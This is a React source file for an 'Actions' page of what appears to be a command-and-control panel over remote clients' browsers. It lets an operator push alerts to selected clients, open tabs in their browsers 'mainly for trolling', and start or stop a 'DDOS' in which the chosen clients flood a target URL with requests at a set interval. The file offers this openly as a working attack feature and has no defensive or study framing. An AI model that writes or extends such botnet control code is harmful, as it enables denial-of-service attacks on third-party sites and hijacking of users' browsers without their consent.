import React from "react";
import MultiClientSelector from "../components/MultiClientSelector";
import { Monitor, ExternalLink } from "lucide-react";
import ActionBox from "../components/ActionBox";
import { GlobalContext } from "../App";
import ToggleableActionBox from "../components/ToggleableActionBox";
import socketManager from "../socket";

const Actions = () => {
  const [selectedClients, setSelectedClients] = React.useState(new Set());
  const [disableMultiSelect, setDisableMultiSelect] = React.useState(false);
  const { selectedClientId, endpointUrl } = React.useContext(GlobalContext);
  const [disableDDOS, setDisableDDOS] = React.useState(false);
  const [socket, setSocket] = React.useState(socketManager.getSocket());
  const { setClients, clients } = React.useContext(GlobalContext);
  React.useEffect(() => {
    // If no clients are selected, disable should be false
    if (selectedClients.size === 0) {
      if (selectedClientId) {
        const client = clients.find(
          (client) => client.client_id === selectedClientId
        );
        setDisableDDOS(client.isPolling === true);
        return;
      }
      setDisableDDOS(false);
      return;
    }

    // Check if all selected clients have isPolling === true
    const allClientsPolling = Array.from(selectedClients).every((client_id) => {
      // Check if isPolling property exists and is true
      const client = clients.find((client) => client.client_id === client_id);
      return client.isPolling === true;
    });

    setDisableDDOS(allClientsPolling);
  }, [selectedClients, clients, selectedClientId]);

  const handleDDOS = async (url, interval) => {
    if (disableDDOS) {
      const stopDOS = async (params) => {
        await fetch(`${endpointUrl}/stoppolling`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(params),
        });
      };
      await executeForClients(stopDOS, {});
      return;
    }
    const startDOS = async (params) => {
      await fetch(`${endpointUrl}/startpolling`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(params),
      });
    };

    await executeForClients(startDOS, { url, interval });
  };
  const executeForClients = async (operation, params) => {
    // If we have selected multiple clients, use those
    if (selectedClients.size > 0) {
      // Execute the operation for each selected client
      const promises = Array.from(selectedClients).map((clientId) =>
        operation({ ...params, client_id: clientId })
      );
      await Promise.all(promises);
    } else if (selectedClientId) {
      // Otherwise, if we have a single selected client, use that
      await operation({ ...params, client_id: selectedClientId });
    }
  };

  const handleAlert = async (message) => {
    const sendAlert = async (params) => {
      await fetch(`${endpointUrl}/alert`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(params),
      });
    };

    await executeForClients(sendAlert, { message });
  };

  const handleTabOpen = async (url) => {
    const openTab = async (params) => {
      await fetch(`${endpointUrl}/openlink`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(params),
      });
    };

    await executeForClients(openTab, { url });
  };
  React.useEffect(() => {
    function onEvent(event) {
      if (event.event === "pollingstate") {
        fetch(`${endpointUrl}/clients`)
          .then((res) => res.json())
          .then((data) => {
            data.sort((a, b) => {
              if (a.online !== b.online) return b.online - a.online;
              return a.client_id.localeCompare(b.client_id);
            });
            setClients(data);
            if (
              selectedClientId == null ||
              !data.find((client) => client.client_id === selectedClientId)
            ) {
              setSelectedClientId(data[0]?.client_id);
            }
          })

          .catch((err) => console.error(err));
      }
    }
    socket.on("event", onEvent);
    return () => {
      socket.off("event", onEvent);
    };
  }, [selectedClientId, endpointUrl, socket]);
  return (
    <div className="flex flex-col-reverse lg:flex-row flex-grow min-h-0 p-4 gap-4">
      <div className="bg-white rounded-lg shadow-lg outline outline-gray-300 outline-1 p-6 h-full flex flex-col flex-[2_2_0%]">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center">
            <Monitor className="h-6 w-6 text-blue-600 mr-2" />
            <h2 className="text-xl font-bold text-gray-800">Actions</h2>
          </div>
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 overflow-y-auto">
          <ActionBox
            title="Send Alert"
            description="Send an alert to a client"
            submitText="Alert"
            onSubmit={handleAlert}
          />
          <ActionBox
            title="Open Tab"
            description="Open a new tab in a client's browser (mainly for trolling)"
            submitText="Open"
            inputPlaceholder="Enter URL"
            icon={ExternalLink}
            onSubmit={handleTabOpen}
          />
          <ToggleableActionBox
            title="Start DDOS"
            description="Selected clients will start spamming requests at the set interval (ms)"
            numberMin={100}
            numberMax={10000}
            numberDefault={300}
            numberPlaceholder="Interval (ms)"
            inputPlaceholder="Enter URL"
            submitText="Start"
            disabledText="Stop"
            disabled={disableDDOS}
            onSubmit={handleDDOS}
          />
        </div>
      </div>
      <MultiClientSelector
        selectedClients={selectedClients}
        setSelectedClients={setSelectedClients}
        disableMultiSelect={disableMultiSelect}
        className="flex-1"
      />
    </div>
  );
};

export default Actions;
